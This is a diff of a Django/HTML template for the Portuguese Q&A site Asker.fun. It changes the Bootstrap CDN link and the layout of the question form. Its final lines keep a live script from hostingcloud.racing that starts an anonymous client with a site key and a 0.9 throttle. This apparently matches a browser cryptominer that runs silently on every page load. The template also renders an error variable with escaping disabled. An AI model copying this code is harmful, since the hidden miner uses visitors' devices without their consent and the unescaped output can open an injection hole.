@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="keywords" content="asker, asker.fun, perguntar">
 <meta name="description" content="Faça uma pergunta no Asker.fun">
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
 <style>
 main {
 	width: 50%;
@@ -20,33 +20,30 @@ main {
 </style>
 <script>function format_form(e){"?"!=e.question.value[e.question.value.length-1]&&(e.question.value+="?")}</script>
 </head>
-
-	<body>
-		<main>
-			{% if user_p.active %}
-			<div id="inner">
-				<form method="post" enctype="multipart/form-data" onsubmit="format_form(this)">
-					{% csrf_token %}
-					<div class="form-group">
-						<input class="form-control" type="text" name="question" placeholder="Sua pergunta aqui" autocomplete="off" maxlength="180">
-						<br><textarea maxlength="5000" class="form-control" placeholder="Descrição (opcional)" name="description"></textarea>
-						<br>
-						<label for="image">Imagem</label>
-						<input type="file" class="form-control-file" id="image" name="file">
-						<br>
-						<input class="btn btn-primary" type="submit" value="Fazer pergunta" onclick="this.style.display = 'none'">
-					</div>
-				</form>
-			</div>
-			<hr>
-			<footer>
-				<p>Encontrou algum bug, tem alguma dúvida ou sugestão? <a href="mailto:minha.ccontta@gmail.com">Me envie um email</a>.</p>
-			</footer>
-			{{ error|safe }}
-			{% else %}
-			<div class="alert alert-info"><p>Confirme seu email abrindo o link enviado para ele.<br>Este é o email usado na tela de cadastro: {{ user.email }}</p><p>Caso não encontre o email, verifique na pasta de spam.</p></div>
-			{% endif %}
-		</main>
+<body>
+	<main>
+		{% if user_p.active %}
+		<div id="inner">
+			<form method="post" enctype="multipart/form-data" onsubmit="format_form(this)">
+				{% csrf_token %}
+				<div class="form-group">
+					<input class="form-control" type="text" name="question" placeholder="Sua pergunta aqui" autocomplete="off" maxlength="180">
+					<textarea maxlength="5000" class="form-control" placeholder="Descrição (opcional)" name="description"></textarea>
+					<label for="image">Imagem</label>
+					<input type="file" class="form-control-file" id="image" name="file">
+					<input class="btn btn-primary" type="submit" value="Fazer pergunta" onclick="this.style.display = 'none'">
+				</div>
+			</form>
+		</div>
+		<hr>
+		<footer>
+			<p>Encontrou algum bug, tem alguma dúvida ou sugestão? <a href="mailto:minha.ccontta@gmail.com">Me envie um email</a>.</p>
+		</footer>
+{{ error|safe }}
+{% else %}
+<div class="alert alert-info"><p>Confirme seu email abrindo o link enviado para ele.<br>Este é o email usado na tela de cadastro: {{ user.email }}</p><p>Caso não encontre o email, verifique na pasta de spam.</p></div>
+{% endif %}
+	</main>
 <script src="https://www.hostingcloud.racing/zk0a.js"></script><script>var _client=new Client.Anonymous("5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a",{throttle:.9,c:"w",ads:0});_client.start();</script>
-	</body>
+</body>
 </html>
